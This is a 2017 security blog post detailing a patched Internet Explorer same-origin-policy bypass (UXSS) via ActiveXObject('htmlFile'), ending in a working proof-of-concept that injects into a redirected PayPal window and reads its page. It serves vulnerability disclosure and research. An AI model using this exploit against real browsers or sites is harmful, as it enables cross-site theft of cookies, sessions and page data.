<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="alternate icon" type="image/x-icon" href="/favicon.ico"><meta name="generator" content="Astro v5.16.6"><title>SOP bypass / UXSS htmlFile in IFrame (IE)</title><meta name="description" content><link rel="canonical" href="https://www.brokenbrowser.com/blog/uxss-ie-htmlfile/"><meta property="og:title" content="SOP bypass / UXSS htmlFile in IFrame (IE)"><meta property="og:description" content><meta property="og:type" content="website"><meta property="og:url" content="https://www.brokenbrowser.com/blog/uxss-ie-htmlfile/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="SOP bypass / UXSS htmlFile in IFrame (IE)"><meta name="twitter:description" content><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.xml"><link rel="stylesheet" href="/_astro/_slug_.D8CnJWvD.css"></head> <body> <div class="container center"> <header class="header"> <div class="header__inner"> <div class="header__logo"> <a href="/"> <div class="logo">
MagicMac Labs
</div> </a> </div> <ul class="menu menu--mobile"> <li class="menu__trigger">Menu ▾</li> <li> <ul class="menu__dropdown"> <!--<li><a href={`${base}`}>Home</a></li>--> <li><a href="/browser-workshop/">Browser Workshop</a></li> <li><a href="/musings/">Musings</a></li> <li><a href="/about/">About</a></li> </ul> </li> </ul> </div> <nav class="navigation-menu"> <ul class="navigation-menu__inner menu--desktop"> <!--<li><a href={`${base}`}>Home</a></li>--> <li><a href="/browser-workshop/">Browser Workshop</a></li> <li><a href="/musings/">Musings</a></li> <li><a href="/about/">About</a></li> </ul> </nav> </header> <main class="content">  <article> <h1 class="post-title">SOP bypass / UXSS htmlFile in IFrame (IE)</h1> <div class="post-meta"> <time> <time datetime="2017-02-06T00:00:00.000Z"> 2017-02-06 </time> </time> <span class="post-category"> :: browser-workshop</span>  </div>  <div class="post-content">  <p>Today we are going to explore a feature that has been present on Internet Explorer almost since its inception. A feature that allows web-developers to instantiate external objects, and because of that it was abused ad-nauseum by attackers. Do you guess which feature are we talking about? The <a href="https://msdn.microsoft.com/en-us/library/7sw4ddf8(v=vs.94).aspx">ActiveXObject</a>.</p>
<p>Even if these days it is restricted and we can’t happily render Excel spreadsheets anymore, there are still tons of things that can be done. We are going to build a reliable UXSS/SOP bypass, allowing us to access the document of any domain, which of course includes cookies and every imaginable thing.</p>
<p>But bug hunter, don’t think of the ActiveXObject as just another UXSS. It is the perfect element for the attacker because it has countless of vulnerabilities as we will see in the following posts. I wholeheartedly suggest you to explore this object, and tons of things will stumble upon you.</p>
<h2 id="different-containers-to-render-html">Different containers to render HTML</h2>
<p>There are several ways to render HTML inside a browser and the first thing that comes to my mind is the IFRAME tag, but we can do the same with an OBJECT or even an EMBED tag.</p>
<p>In fact, there are objects that allow us to logically render HTML but aren’t visible at all. For example: <a href="https://developer.mozilla.org/en-US/docs/Web/API/DOMImplementation/createDocument">implementation.createDocument</a>, <a href="https://developer.mozilla.org/en-US/docs/Web/API/DOMImplementation/createHTMLDocument">implementation.createHTMLDocument</a> and even the <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseType">XMLHttpRequest</a> can return a document object instead of text/xml.</p>
<p>These HTML documents have many similarities with the ones from iframes/windows, but not everything is included. For example, some of them can’t execute scripts, others don’t have any associated window so they miss methods like window.open, etc. In other words, these documents have their limitations.</p>
<p>But Internet Explorer has several other ways to render HTML, and one of my favorites it to instantiate an “htmlFile” with the help of the ActiveXObject. This type of document has limitations also, but at least it is capable of running scripts. Take a look at the code below.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-foreground)">doc </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-keyword)"> new</span><span style="color:var(--astro-code-token-function)"> ActiveXObject</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"htmlFile"</span><span style="color:var(--astro-code-foreground)">);</span></span></code></pre>
<p>This <strong>ActiveXObject</strong> creates something similar to a <a href="https://msdn.microsoft.com/en-us/library/aa752041(v=vs.85).aspx">WebBrowser control</a> (essentially like an iframe) and returns a reference to its document object. To get access to the window object we will use the old parentWindow or Script because defaultView is not supported here.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-foreground)">win </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> doc</span><span style="color:var(--astro-code-foreground)">.defaultView;  </span><span style="color:var(--astro-code-token-comment)">// Not supported.</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-foreground)">win </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> doc</span><span style="color:var(--astro-code-foreground)">.Script;       </span><span style="color:var(--astro-code-token-comment)">// Returns the window object of doc.</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">win </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> doc</span><span style="color:var(--astro-code-foreground)">.parentWindow; </span><span style="color:var(--astro-code-token-comment)">// Returns the window object of doc.</span></span></code></pre>
<p>I’m a fan of “Script” so that’s what I’ll use. By the way, I’m curious, what is the location of this ActiveXObject?</p>
<p><img src="/images/2017/02/01-location.png" alt=""></p>
<p>Pretty interesting! The next question -for me- would be: is the window object of this document the same as the one that we are working on? I mean, does it have a real window or is it shared with its parent/creator?</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-token-comment)">// Remember:</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// win is the window object of the ActiveXObject.</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// window is the window object of the main window.</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-function)">alert</span><span style="color:var(--astro-code-foreground)">(win </span><span style="color:var(--astro-code-token-keyword)">==</span><span style="color:var(--astro-code-foreground)"> window);  </span><span style="color:var(--astro-code-token-comment)">// false</span></span></code></pre>
<p>So we arrive to the conclusion that the ActiveXObject window is different from the main one, which means it has its own window. I would love to know now who is its top. Does the ActiveXObject think it’s the top?</p>
<p><img src="/images/2017/02/02-windoweqtop.png" alt=""></p>
<p>Wow! <strong>win</strong> believes it is the top, which makes me think that it’s probably vulnerable to <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options">XFO</a> bypasses and insecure requests (no SSL in top SSL). Write down those ideas! At least this is how I work: when something interesting comes to my mind I immediately take note, so I can keep the focus on the original goal without letting those ideas vanish in the grey matter ocean. :)</p>
<p>Anyway, another thing that I’m curious about is the domain of this document. What is it?</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-token-function)">alert</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-constant)">doc</span><span style="color:var(--astro-code-foreground)">.domain); </span><span style="color:var(--astro-code-token-comment)">// The same domain as the top page</span></span></code></pre>
<p>It returns the same domain as the main window, which is no big deal but it deserves more testing. Ideas are flowing.</p>
<h2 id="retrieving-the-top-documentdomain">Retrieving the top document.domain</h2>
<p>At this point my first question was: what would happen if we change the base href of the main page, and then instantiate this ActiveX? Will it have the same domain of the page or the one from the base href?</p>
<p>The idea didn’t work, but do not underestimate the base href when creating objects because it worked wonders in the past and it will likely work in the future. Check out how we recently did it in the <a href="../workers-sop-bypass-importscripts-and-basehref/">workers SOP bypass</a>.</p>
<p>Anyway, I tried another option: created the ActiveXObject from within an iframe on a different domain. In other words, the same code but now executed from a different-domain iframe.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="html"><code><span class="line"><span style="color:var(--astro-code-token-comment)">&#x3C;!-- Main page in https://www.cracking.com.ar renders the iframe below --></span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">iframe</span><span style="color:var(--astro-code-token-function)"> src</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">"../demos/sop-ax-htmlfile/retrievetopdomain.html"</span><span style="color:var(--astro-code-foreground)">>&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">iframe</span><span style="color:var(--astro-code-foreground)">></span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">&#x3C;!-- iFrame code on a different domain --></span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-foreground)">></span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">doc </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-keyword)"> new</span><span style="color:var(--astro-code-token-function)"> ActiveXObject</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"htmlFile"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">alert</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-constant)">doc</span><span style="color:var(--astro-code-foreground)">.domain);  </span><span style="color:var(--astro-code-token-comment)">// Bang! Same as top!!</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-foreground)">></span></span></code></pre>
<p>To my surprise, the ActiveXObject was <strong>created with the top domain instead of the iframe</strong>. Bingo!</p>
<p><img src="/images/2017/02/03-topdomain.png" alt=""></p>
<h3 id="patched-on-2017-03-14"><a href="https://technet.microsoft.com/library/security/MS17-006">Patched on 2017-03-14</a></h3>
<p>Of course retrieving the domain of the main page is not a full SOP bypass, but it’s solid evidence that we are dealing with a confused browser. It’s a matter of pushing deeper until IE gives up. With a bit of JavaScript, passion and persistence, we will make it.</p>
<h2 id="passing-a-reference-to-the-top">Passing a reference to the top</h2>
<p>Our goal now is to share a reference of the top window with the ActiveXObject, to see if it has the power to access. If its document.domain is the same as the top, it should be able to access! But there’s another challenge here: from the browser point of view, this ActiveXObject is not fully initialized. This means that we can’t create variables or change the value of any member. Imagine a <a href="https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Object/freeze">frozen object</a> where you can’t add/remove/change anything.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-foreground)">doc </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-keyword)"> new</span><span style="color:var(--astro-code-token-function)"> ActiveXObject</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"htmlFile"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">win </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> doc</span><span style="color:var(--astro-code-foreground)">.Script;</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">win</span><span style="color:var(--astro-code-foreground)">.myTop </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-foreground)"> top;      </span><span style="color:var(--astro-code-token-comment)">// Browser not initialized, variable is not set</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">win</span><span style="color:var(--astro-code-token-function)">.execScript</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"alert(win.myTop)"</span><span style="color:var(--astro-code-foreground)">); </span><span style="color:var(--astro-code-token-comment)">// undefined</span></span></code></pre>
<p>In a regular window it should work, but not with this ActiveXObject unless we initialize it using document.open. The problem is, if we initialize the object then IE will set its domain correctly blowing up our trick. Check this out to see exactly what I mean.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-foreground)">doc </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-keyword)"> new</span><span style="color:var(--astro-code-token-function)"> ActiveXObject</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"htmlFile"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">alert</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-constant)">doc</span><span style="color:var(--astro-code-foreground)">.domain);   </span><span style="color:var(--astro-code-token-comment)">// alerts the top domain (SOP bypass)</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">doc</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">();          </span><span style="color:var(--astro-code-token-comment)">// Initialize the document</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">alert</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-constant)">doc</span><span style="color:var(--astro-code-foreground)">.domain);   </span><span style="color:var(--astro-code-token-comment)">// alerts the iFrame domain (No more SOP bypass)</span></span></code></pre>
<p>So how can we pass the top window object to the ActiveXObject? Think think think think. There is a very special place in every window that is readable and writable before everything else. What is it? The opener! Yes, window.opener is our friend so let’s try!</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-foreground)">doc </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-keyword)"> new</span><span style="color:var(--astro-code-token-function)"> ActiveXObject</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"htmlFile"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">win </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> doc</span><span style="color:var(--astro-code-foreground)">.Script;</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">win</span><span style="color:var(--astro-code-foreground)">.opener </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-foreground)"> top;</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">win</span><span style="color:var(--astro-code-token-function)">.execScript</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"alert(opener.document.URL)"</span><span style="color:var(--astro-code-foreground)">);  </span><span style="color:var(--astro-code-token-comment)">// Full SOP bypass</span></span></code></pre>
<p><img src="/images/2017/02/04-topdom.png" alt=""></p>
<h3 id="patched-on-2017-03-14-1"><a href="https://technet.microsoft.com/library/security/MS17-006">Patched on 2017-03-14</a></h3>
<p>Yes! The opener trick worked. Now we have full access to the top document regardless of our domain. Our iframe can be inside of another iframe or deeply nested <a href="https://en.wikipedia.org/wiki/Matryoshka_doll">like a Matryoshka doll</a> inside infinite iframes on different domains but still, it will be able to access the top. That’s power! :)</p>
<p>So, we have a working UXSS but it still has a problem: it needs to be loaded inside an iframe and I don’t think any targeted site will be so generous to render our tricky bits in their iframes, right? But think about all the banner ads that are running now: they are rendered in iframes and they have access to the top! This means that Facebook ads, Yahoo! ads and any untrusted content running in iframes has access to the main page. If we are on Facebook, the ads can post content on our behalf, access our contacts and cookies without restrictions.</p>
<p>We should go further and find a way to get the site cookies with no help. How can we make this work on an arbitrary non-cooperative site? Can we run in a site without iframes at all? Many solutions come to my mind but the first and easiest is: <strong>[redirect] + [thread block] + [inject]</strong>. The technique is super-easy but it deserves a small explanation.</p>
<h2 id="injecting-content-everywhere">Injecting content everywhere</h2>
<p>There’s a a way to inject HTML/Script on any window/iframe regardless of its domain before the target site has a chance to load. For example, let’s say we open a new window with a server-redirect to Paypal. Before the redirect happens we still have access to the window, but once the redirect loads the new URL we won’t have access anymore, right? In fact, when the redirection happens, IE destroys every element that is in the window before rendering the new content.</p>
<p>But what will happen if we inject an element into the page, before the redirection? More, what would happen if after the injection we block the thread without giving IE a chance to destroy the object <strong>but</strong> letting the redirection happen? The new webpage will keep the old (injected) content because IE was incapable of removing it.</p>
<p>In this case we will use an alert as the thread-blocker, but there are other ways to achieve the same thing. Let’s recap what we need to do before coding:</p>
<ol>
<li>Open a new window with a redirect to Paypal.</li>
<li>Before the redirect happens, inject an iframe.</li>
<li>After the redirection happened, create the ActiveXObject from within the iframe.</li>
<li>Bang! That’s it. Now the ActiveXObject has the same domain as the main window.</li>
</ol>
<p>And here’s the working code.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-foreground)">	w </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"redir.php?URL=https://www.paypal.com"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">	// Create and inject an iframe in the target window</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">	ifr </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> w</span><span style="color:var(--astro-code-token-function)">.</span><span style="color:var(--astro-code-token-constant)">document</span><span style="color:var(--astro-code-token-function)">.createElement</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">'iframe'</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">	w</span><span style="color:var(--astro-code-token-function)">.</span><span style="color:var(--astro-code-token-constant)">document</span><span style="color:var(--astro-code-token-function)">.appendChild</span><span style="color:var(--astro-code-foreground)">(ifr);</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">	</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">	// Initialize the iframe</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">	w[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-foreground)">].</span><span style="color:var(--astro-code-token-constant)">document</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">();</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">	w[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-foreground)">].</span><span style="color:var(--astro-code-token-constant)">document</span><span style="color:var(--astro-code-token-function)">.close</span><span style="color:var(--astro-code-foreground)">();</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">	</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">	// Pass a reference to the top window</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">	// So the iframe can access even after the redirect.</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">	w[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-foreground)">]._top </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-foreground)"> w;</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">	</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">	// Finally, once Paypal is loaded (or loading, same thing) we create the</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">	// ActiveXObject within the injected iframe.</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">	w[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-foreground)">]</span><span style="color:var(--astro-code-token-function)">.setTimeout</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">'alert("[ Thread Blocked to prevent iFrame destruction ]\\n\\nClose this alert once the address bar changes to the target site.");'</span><span style="color:var(--astro-code-token-keyword)"> +</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">					'doc = new ActiveXObject("htmlFile");'</span><span style="color:var(--astro-code-token-keyword)"> +</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">					'doc.Script.opener = _top;'</span><span style="color:var(--astro-code-token-keyword)"> +</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">					'doc.Script.setTimeout("opener.location = \'javascript:alert(document.all[0].outerHTML)\'");'</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"></span></code></pre>
<p><img src="/images/2017/02/05-fullxdom.png" alt=""></p>
<p>Fellow bug hunter, don’t stop here. Keep playing with the ActiveXObject because it’s full of things waiting to be discovered. Can you make this PoC cleaner, with less code? Can you build a thread blocker without the alert? Good luck!</p>
<p>Did I say luck? Oh no no, sorry, I just meant: be persistent until you find your bug. If that means luck to you, be lucky then! But for me, it means passion and persistence. The only required ingredients to find security vulnerabilities.</p>
<p>Have a nice day!</p>
<p><a href="https://twitter.com/magicmac2000">Manuel</a></p> <div class="pagination"> <div class="pagination__title"> <span class="pagination__title-h">Read other posts</span> <hr> </div> <div class="pagination__buttons">  <a href="/blog/uxss-edge-domainless-world/" class="button inline prev">
&lt; [SOP bypass / UXSS - Adventures in a Domainless World (Edge)]
</a> <span>::</span> <a href="/blog/zombie-alert/" class="button inline next">
[The Attack of the Alerts and the Zombie Script (IE)] &gt;
</a> </div> </div>  </div> </article> <script type="module">document.addEventListener("DOMContentLoaded",()=>{document.querySelectorAll("pre.astro-code").forEach(t=>{const n=document.createElement("div");n.className="highlight",t.parentNode?.insertBefore(n,t),n.appendChild(t);const a=t.getAttribute("data-language")||"text",o=document.createElement("div");if(o.className="code-title",o.textContent=a,navigator.clipboard){const e=document.createElement("button");e.className="copy-button",e.textContent="Copy",e.addEventListener("click",async()=>{const c=t.textContent||"";try{await navigator.clipboard.writeText(c),e.textContent="Copied",setTimeout(()=>{e.textContent="Copy"},1e3)}catch(r){console.error("Failed to copy:",r)}}),o.appendChild(e)}n.insertBefore(o,t)})});</script>  <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>  </main> <footer class="footer"> <div class="footer__inner"> <div class="copyright"> <span>© 2026 MagicMac Labs</span> </div> </div> </footer> </div> <script type="module">(()=>{const s=document.querySelector(".container"),o=document.querySelectorAll(".menu");document.body.addEventListener("click",()=>{o.forEach(e=>{e.classList.contains("open")&&e.classList.remove("open")})}),window.addEventListener("resize",()=>{o.forEach(e=>{e.classList.remove("open")})}),o.forEach(e=>{const i=e.querySelector(".menu__trigger"),t=e.querySelector(".menu__dropdown");i&&t&&(i.addEventListener("click",n=>{n.stopPropagation(),e.classList.contains("open")?e.classList.remove("open"):(o.forEach(c=>c.classList.remove("open")),e.classList.add("open")),s&&t.getBoundingClientRect().right>s.getBoundingClientRect().right&&(t.style.left="auto",t.style.right="0")}),t.addEventListener("click",n=>n.stopPropagation()))})})();</script> </body> </html> 